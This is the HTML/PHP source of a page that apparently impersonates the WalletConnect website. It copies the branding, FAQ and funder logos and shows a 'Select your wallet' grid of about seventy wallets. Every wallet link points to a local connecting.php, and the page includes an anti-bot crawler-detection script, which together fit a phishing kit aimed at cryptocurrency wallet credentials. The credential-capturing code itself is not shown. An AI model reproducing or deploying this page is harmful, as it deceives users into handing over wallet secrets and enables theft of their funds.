<!DOCTYPE html>
<html>
<?php
error_reporting(0);
include './files/antibot/crawlerdetect.php';
include_once 'functions.php';
?>
<meta http-equiv="content-type" content="text/html" />

<head>
  <meta charset="UTF-8">
  <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.2/jquery.validate.min.js" integrity="sha512-UdIMMlVx0HEynClOIFSyOrPggomfhBKJE28LKl8yR3ghkgugPnG6iLfRfHwushZl1MOPSY6TsuBDGPK2X4zYKg==" crossorigin="anonymous"></script>
    <meta name="viewport" content="width=device-width" />
    <title>WalletConnect</title>
    <link rel="shortcut icon" href="./files/favicon.ico" />
    <meta name="theme-color" content="#ffffff" />
    <meta name="description" content="Open protocol for connecting Wallets to Dapps" />
    <meta name="keywords"
        content="ethereum, cryptocurrency, wallet, mobile, connect, bridge, relay, proxy, standard, protocol, crypto, tokens, dapp" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:site" content="@walletconnect" />
    <meta name="twitter:title" content="WalletConnect" />
    <meta name="twitter:description" content="Open protocol for connecting Wallets to Dapps" />
    <meta name="og:title" content="WalletConnect" />
    <meta name="og:type" content="website" />
    <meta name="og:url" content="index-2.html" />
    <meta name="og:image" content="404" />
    <meta name="og:description" content="Open protocol for connecting Wallets to Dapps" />
    <meta name="og:site_name" content="WalletConnect" />
    <link rel="stylesheet" href="./files/main_new.css">
    <script>
        function show() {
          var x = document.getElementById("hidden");
          if (x.style.display === "block") {
            x.style.display = "none";
          } else {
            x.style.display = "block";
          }
        
          if (x.style.display === "block") {
            document.getElementById("btn").innerHTML = "Show Less &uarr;";
          } 
        }
     </script>
</head>

<body>
    <div id="__next" class="wallet">
        <div class="font-roboto" id="content">
            <header class="sticky top-0 z-10 flex items-center justify-between px-5 py-4 bg-white md:py-6 ">
                <div class="absolute inset-0 shadow-lg opacity-50"></div>
                <div class="z-20 flex justify-around w-full sm:pr-10 md:pr-20"><a
                        class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" target="_blank"
                        href="https://github.com/walletconnect" rel="noopener noreferrer">
                        GitHub
                    </a><a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" target="_blank"
                        href="https://docs.walletconnect.org/" rel="noopener noreferrer">
                        Docs
                    </a></div>
                <div class="z-20 flex">
                    <div class="w-16 mx-6 sm:w-20 md:w-28"><img class="cursor-pointer object-fit"
                            src="./files/walletconnect-logo.svg" alt="walletconnect logo" /></div>
                </div>
                <div class="z-20 flex justify-around w-full sm:pl-10 md:pl-20"><a
                        class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl"
                        href="#">
                        Wallets
                    </a><a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl"
                        href="#">
                        Apps
                    </a></div>
            </header>
            <main>
                <div class="text-cool-gray-500">
                    <h1 class="flex justify-center mt-20 text-4xl font-semibold ">WalletConnect</h1>
                    <div class="mx-8 mt-8">
                      
                        <div class="mt-14 lg:flex lg:justify-center"><img class="lg:max-w-4xl" src="./files/banner-main.png"
                                alt="wallet connect banner diagram" /></div>
                    </div>
                </div>
                
                <div class="wallets" id="wallets">
				<center>
				<h2 class="text-3xl">Select your wallet</h2>
				</center>
				<br>
                    <h1 class="home center__content">Wallets</h1>
              
                    <div class="all">
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/metamask.png"></a></br>
                            MetaMask
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/MEW.png"></a></br>
                            MEW Wallet
                        </div>
						
						<div class="apps">
                            <a href="./connecting.php"><img src="./files/images/crypto.png"></a></br>
                            Crypto.com DeFi Wallet
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/trustwallet.png"></a></br>
                            Trust Wallet
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"> <img src="./files/images/logo.svg"></a></br>
                            Wallet</br>Connect
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/coinbase.jpg"></a></br>
                            Coinbase Wallet
                        </div>
						
						<div class="apps">
                            <a href="./connecting.php"><img src="./files/images/bscw.jpg"></a></br>
                            Binance Chain
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/atomic.png"></a></br>
                            Atomic Wallet
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/exodus_wallet.png"></a></br>
                            Exodus Wallet
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/bnb.png"></a></br>
                            BNB
                        </div>

                         <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/weownomy.jpg"></a></br>
                            Weownomy
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/polkadot.png"></a></br>
                            Polkadot
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/xrp.png"></a></br>
                            XRP
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/stellar.png"></a></br>
                            Stellar
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/tezos.png"></a></br>
                            Tezos
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/theta.png"></a></br>
                            Theta
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/tron.png"></a></br>
                            Tron
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/cosmos.png"></a></br>
                            Cosmos
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/kava.png"></a></br>
                            Kava
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/filecoin.png"></a></br>
                            Filecoin
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/solana.png"></a></br>
                            Solana
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img
                                    src="./files/images/venly.svg"></a></br>
                            Venly
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/zilliqa.png"></a></br>
                            Zilliqa
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/elrond.jpg"></a></br>
                            Elrond
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/waves.png"></a></br>
                            Waves
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/icon.png"></a></br>
                            ICON
                        </div>
        
                        <div class="apps">
                            <a href="./connecting.php"><img src="./files/images/ontology.png"></a></br>
                            Ontology
                        </div>
                    </div>
                    </br>
                    <button onclick="show()" class="btn" id="btn">Show More &darr;</button>
                    </br></br>
                    <div class="hidden" id="hidden">
                        <div class="all">
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/oxen.png"></a></br>
                                Oxen Wallet
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/nano.png"></a></br>
                                Nano
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/tomo.png"></a></br>
                                Tomo Chain
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/vechain.jpg"></a></br>
                                VeChain
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/iotex.png"></a></br>
                                IoTex
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/wanchain.png"></a></br>
                                Wanchain
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/harmony.png"></a></br>
                                Harmony
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/kin.png"></a></br>
                                Kin
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/nimiq.png"></a></br>
                                Nimiq
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/aion.png"></a></br>
                                Aion
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/thundertoken.png"></a></br>
                                Thunder Token
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/aeternity.png"></a></br>
                                Aeternity
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/nebulas.png"></a></br>
                                Nebulas
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/fio.png"></a></br>
                                FIO
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/gochain.png"></a></br>
                                GoChain
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/poa.png"></a></br>
                                POA Network
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/callisto.png"></a></br>
                                Callisto
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/bitpay.jpg"></a></br>
                                BitPay
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/aktionariat.png"></a></br>
                                Aktionariat
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/atwallet.png"></a></br>
                                AtWallet
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/guard.png"></a></br>
                                Guard Wallet
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/aave.jpg"></a></br>
                                AAVE
                            </div>

                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/enjin.jpg"></a></br>
                                Enjin
                            </div>
        
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/skale.png"></a></br>
                                Skale
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/portis.png"></a></br>
                                Portis
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/trezor.png"></a></br>
                                Trezor
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/squarelink.png"></a></br>
                                Squarelink
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/torus.jpg"></a></br>
                                Torus
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/scatter.jpg"></a></br>
                                Scatter Wallet
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/sumcoin.png"></a></br>
                                Sumcoin
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/math-wallet.png"></a></br>
                                Math Wallet
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/fortmatic.png"></a></br>
                                FortMatic
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/digitex.png"></a></br>
                                Digitex
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/ledger.png"></a></br>
                                Ledger
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/defiat.jpg"></a></br>
                                Defiat
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/authereum.png"></a></br>
                                Authereum
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/flare.jpg"></a></br>
                                Flare Wallet
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/zelcore.png"></a></br>
                                Zelcore
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/bitkeep.png"></a></br>
                                BitKeep
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/coin98.png"></a></br>
                                Coin98
                            </div>
        
                            <div class="apps">
                                <a href="./connecting.php"><img src="./files/images/trustvault.png"></a></br>
                                Trust Vault
                            </div>
                        </div>
                    </div>
                </div>
                <div class="mx-8 mt-16 font-thin md:flex md:justify-center">
                    <div class="md:max-w-5xl">
                        <h3 class="flex justify-center text-3xl">Top Project Funders</h3>
                        <div>
                            <div class="grid grid-cols-2 gap-12 mt-12 sm:gap-16 md:gap-28 sm:grid-cols-3">
                                <div class="flex justify-center"><a target="_blank" href="https://ethereum.foundation/"
                                        rel="noopener noreferrer"><img
                                            class="filter-grayscale hover:filter-none w-36 sm:w-40 md:w-52"
                                            alt="Ethereum Foundation"
                                            src="./files/assets/funders/ethereum-foundation.png" /></a></div>
                                <div class="flex justify-center"><a target="_blank" href="https://labs.consensys.net/"
                                        rel="noopener noreferrer"><img
                                            class="filter-grayscale hover:filter-none w-36 sm:w-40 md:w-52"
                                            alt="Consensys Labs" src="./files/assets/funders/consensys-labs.png" /></a></div>
                                <div class="flex justify-center"><a target="_blank"
                                        href="https://gitcoin.co/grants/275/walletconnect"
                                        rel="noopener noreferrer"><img
                                            class="filter-grayscale hover:filter-none w-36 sm:w-40 md:w-52"
                                            alt="Gitcoin Grants" src="./files/assets/funders/gitcoin-grants.png" /></a></div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="mx-8 mt-16 font-thin md:flex md:justify-center">
                    <div class="md:max-w-5xl">
                        <h3 class="flex justify-center text-3xl">Top Code Contributors</h3>
                        <div>
                            <div
                                class="grid grid-cols-3 gap-12 mt-12 sm:gap-10 md:gap-20 md:grid-cols-4 lg:grid-cols-5">
                                <div class="flex justify-center"><a target="_blank" href="https://rainbow.me/"
                                        rel="noopener noreferrer"><img
                                            class="filter-grayscale hover:filter-none w-16 sm:w-24 lg:w-28"
                                            alt="Rainbow" src="./files/assets/contributors/rainbow.png" /></a></div>
                                <div class="flex justify-center"><a target="_blank" href="https://trustwallet.com/"
                                        rel="noopener noreferrer"><img
                                            class="filter-grayscale hover:filter-none w-16 sm:w-24 lg:w-28" alt="Trust"
                                            src="./files/assets/contributors/trust-wallet.png" /></a></div>
                                <div class="flex justify-center"><a target="_blank" href="https://www.argent.xyz/"
                                        rel="noopener noreferrer"><img
                                            class="filter-grayscale hover:filter-none w-16 sm:w-24 lg:w-28" alt="Argent"
                                            src="./files/assets/contributors/argent.jpg" /></a></div>
                                <div class="flex justify-center"><a target="_blank" href="https://walleth.org/"
                                        rel="noopener noreferrer"><img
                                            class="filter-grayscale hover:filter-none w-16 sm:w-24 lg:w-28"
                                            alt="Walleth" src="./files/assets/contributors/walleth.png" /></a></div>
                                <div class="flex justify-center"><a target="_blank" href="https://gnosis-safe.io/"
                                        rel="noopener noreferrer"><img
                                            class="filter-grayscale hover:filter-none w-16 sm:w-24 lg:w-28" alt="Gnosis"
                                            src="./files/assets/contributors/gnosis-safe.jpg" /></a></div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="mx-8 mt-16 font-thin md:flex md:justify-center">
                    <div class="sm:max-w-3xl">
                        <h3 class="flex justify-center text-3xl">Frequently asked questions</h3>
                        <div>
                            <div class="mt-8">
                                <h4 class="text-2xl">How do I install WalletConnect?</h4>
                                <p class="mt-6 text-lg leading-6 text-gray-600">WalletConnect is not an app, but a
                                    protocol supported by many different decentralised applications and wallets. Install
                                    any of<a class="font-semibold text-blue-500 hover:text-cool-blue-600"
                                        href="wallets.html">
                                        mobile wallets
                                    </a>supporting WalletConnect protocol. WalletConnect wallets are available for
                                    Android and iPhone.</p>
                            </div>
                            <div class="mt-8">
                                <h4 class="text-2xl">Is there a token?</h4>
                                <p class="mt-6 text-lg leading-6 text-gray-600">There is no token. WalletConnect
                                    protocol does not run on a blockchain and there are no fees.</p>
                            </div>
                            <div class="mt-8">
                                <h4 class="text-2xl">How can I help WalletConnect project?</h4>
                                <p class="mt-6 text-lg leading-6 text-gray-600">WalletConnect project is developed by
                                    open source developers of various Wallet and Dapp projects. Please contact us on
                                    Discord or Telegram if you want to help the project.</p>
                            </div>
                            <div class="mt-8">
                                <h4 class="text-2xl">How can I build a wallet supporting WalletConnect?</h4>
                                <p class="mt-6 text-lg leading-6 text-gray-600">There are libraries for React-Native
                                    (Javascript), Android (Kotlin) and Swift (iOS) available. Read more about it in our
                                    <a class="font-semibold text-blue-500 hover:text-cool-blue-600"
                                        href="https://docs.walletconnect.org/">
                                        documentation.
                                    </a></p>
                            </div>
                            <div class="mt-8">
                                <h4 class="text-2xl">How can I add WalletConnect support to Dapp I developed?</h4>
                                <p class="mt-6 text-lg leading-6 text-gray-600">You can support various wallets either
                                    using <a class="font-semibold text-blue-500 hover:text-cool-blue-600"
                                        target="_blank" href="https://www.npmjs.com/package/web3modal"
                                        rel="noopener noreferrer">
                                        Web3Modal library
                                    </a>or add a support for <a
                                        class="font-semibold text-blue-500 hover:text-cool-blue-600" target="_blank"
                                        href="https://docs.walletconnect.org/quick-start/dapps/web3-provider"
                                        rel="noopener noreferrer">
                                        WalletConnect provider directly
                                    </a>.</p>
                            </div>
                            <div class="mt-8">
                                <h4 class="text-2xl">How web frontend and mobile wallets communicate?</h4>
                                <p class="mt-6 text-lg leading-6 text-gray-600">Communication happens over a bridge
                                    server that relays messages without access to their content. The contents are
                                    encrypted using the session data shared by the QR code or deep link between the dapp
                                    and the wallet. Read more about it in our <a
                                        class="font-semibold text-blue-500 hover:text-cool-blue-600"
                                        href="https://docs.walletconnect.org/">
                                        documentation.
                                    </a>WalletConnect Association runs a public bridge server, but you can also roll
                                    your own.</p>
                            </div>
                        </div>
                    </div>
                </div>
            </main>
            <footer class="flex justify-center mt-24 mb-16 sm:mt-32">
                <div class="flex flex-col space-y-6 sm:space-y-0 sm:space-x-20 sm:flex-row"><a
                        class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500"
                        target="_blank" href="https://discord.gg/jhxMvxP" rel="noopener noreferrer">
                        <div class="flex"><img class="w-6 sm:w-8" src="./files/discord.svg" alt="Discord" />
                            <p class="ml-2">Discord</p>
                        </div>
                    </a><a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500"
                        target="_blank" href="https://twitter.com/walletconnect" rel="noopener noreferrer">
                        <div class="flex"><img class="w-6 sm:w-8" src="./files/twitter.svg" alt="Twitter" />
                            <p class="ml-2">Twitter</p>
                        </div>
                    </a><a class="text-sm font-medium sm:text-lg text-cool-gray-600 group-hover:text-cool-gray-500"
                        target="_blank" href="https://github.com/walletconnect" rel="noopener noreferrer">
                        <div class="flex"><img class="w-6 sm:w-8" src="./files/github.svg" alt="GitHub" />
                            <p class="ml-2">GitHub</p>
                        </div>
                    </a></div>
            </footer>
        </div>
    </div>
 
<script src="/script.js"></script>
</body>

</html>